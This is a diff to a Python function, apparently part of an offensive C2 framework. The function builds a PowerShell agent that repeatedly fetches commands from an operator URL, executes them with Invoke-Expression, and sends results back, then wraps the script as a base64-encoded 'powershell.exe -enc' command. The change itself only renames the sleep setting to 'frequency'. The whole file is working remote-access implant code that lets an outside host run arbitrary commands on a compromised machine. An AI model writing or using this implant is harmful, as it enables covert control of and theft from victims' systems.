@@ -1,16 +1,16 @@
 from base64 import b64encode
 
-def generate(url, sleep):
+def generate(url, frequency):
     payload = """
     $ProgressPreference = 'SilentlyContinue'
-    $sleep = %SLEEP%
+    $frequency = %SLEEP%
     $post = ''
     while ($true)
     {
-        Start-Sleep -Seconds $sleep
+        Start-Sleep -Seconds $frequency
         $cmd = Invoke-WebRequest '%URL%'
         if ($cmd.Content -eq 'exit-agent') { break }
-        if ($cmd.Content -like '*set-sleep*') { $sleep = $cmd.Content.replace("set-sleep ", ""); continue }
+        if ($cmd.Content -like '*set-frequency*') { $frequency = $cmd.Content.replace("set-frequency ", ""); continue }
         if ($cmd.Content -eq '') { continue }
 
         $result = Invoke-Expression $cmd
@@ -28,7 +28,7 @@ def generate(url, sleep):
         $post = ''
     }
     """
-    payload = payload.replace("%SLEEP%", str(sleep))
+    payload = payload.replace("%SLEEP%", str(frequency))
     payload = payload.replace("%URL%", url)
     encoded = b64encode(payload.encode('UTF-16LE'))
     return "powershell.exe -enc " + str(encoded).replace("b'", "").replace("'", "")
